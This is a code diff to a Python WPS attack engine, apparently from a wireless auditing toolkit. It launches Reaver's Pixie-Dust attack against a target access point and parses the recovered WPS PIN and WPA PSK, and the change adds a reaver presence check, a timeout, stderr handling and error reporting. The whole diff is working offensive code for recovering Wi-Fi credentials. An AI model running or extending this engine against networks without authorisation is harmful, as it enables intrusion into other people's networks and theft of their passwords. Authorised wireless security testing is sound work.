@@ -5,6 +5,7 @@ Pixie-Dust vulnerabilities using Reaver/Bully logic or beacon parsing.
 """
 import asyncio
 import logging
+import shutil
 from typing import Any
 
 from ..core.attack import BaseAttackEngine, AttackConfig, AttackResult, AttackState
@@ -26,6 +27,8 @@ class WPSEngine(BaseAttackEngine):
         iface = kwargs.get("iface")
         if not iface:
             return AttackResult(False, ["No interface provided for WPS attack."])
+        if shutil.which("reaver") is None:
+            return AttackResult(False, ["reaver is not installed or not in PATH."])
 
         self.state = AttackState.RUNNING
         logger.info("Starting WPS attack on %s (BSSID: %s)", iface, config.target_bssid)
@@ -42,23 +45,52 @@ class WPSEngine(BaseAttackEngine):
 
         found_pin = None
         found_psk = None
+        errors: list[str] = []
+        timeout = float(kwargs.get("timeout", config.timeout))
 
         await self._emit_progress(status="Running Reaver Pixie-Dust...")
 
-        # Poll stdout for results
-        try:
-            async for line in self.mgr.stream(cmd):
+        def parse_line(line: str) -> None:
+            nonlocal found_pin, found_psk
+            if "WPS PIN:" in line:
+                found_pin = line.split("WPS PIN:", 1)[1].strip().strip("'")
+            elif "WPA PSK:" in line:
+                found_psk = line.split("WPA PSK:", 1)[1].strip().strip("'")
+
+        async def read_pipe(pipe, label: str) -> None:
+            if pipe is None:
+                return
+            async for line_b in pipe:
                 if self.state != AttackState.RUNNING:
                     break
-                line_str = line.strip()
-                if "WPS PIN:" in line_str:
-                    found_pin = line_str.split("WPS PIN:")[1].strip().strip("'")
-                elif "WPA PSK:" in line_str:
-                    found_psk = line_str.split("WPA PSK:")[1].strip().strip("'")
-                await self._emit_progress(status=f"WPS: {line_str[-40:]}")
+                line = line_b.decode(errors="replace").strip()
+                if not line:
+                    continue
+                parse_line(line)
+                await self._emit_progress(status=f"WPS {label}: {line[-48:]}")
                 if found_pin and found_psk:
+                    await self.stop()
                     break
+
+        try:
+            self._proc = await self.mgr.start_background(cmd, capture_output=True)
+            read_task = asyncio.gather(
+                read_pipe(self._proc.stdout, "out"),
+                read_pipe(self._proc.stderr, "err"),
+            )
+            wait_task = asyncio.create_task(self._proc.wait())
+            done, pending = await asyncio.wait(
+                {read_task, wait_task},
+                timeout=timeout,
+                return_when=asyncio.FIRST_COMPLETED,
+            )
+            if not done:
+                errors.append(f"Reaver timed out after {int(timeout)}s")
+                await self._emit_progress(status=errors[-1])
+            for task in pending:
+                task.cancel()
         except Exception as e:
+            errors.append(str(e))
             logger.debug("WPS read error: %s", e)
 
         await self.stop()
@@ -71,7 +103,7 @@ class WPSEngine(BaseAttackEngine):
         else:
             logger.info("WPS Attack failed or AP is not vulnerable.")
 
-        return AttackResult(success=success, stats=stats)
+        return AttackResult(success=success, errors=errors, stats=stats)
 
     async def stop(self) -> None:
         """Stop the WPS attack."""
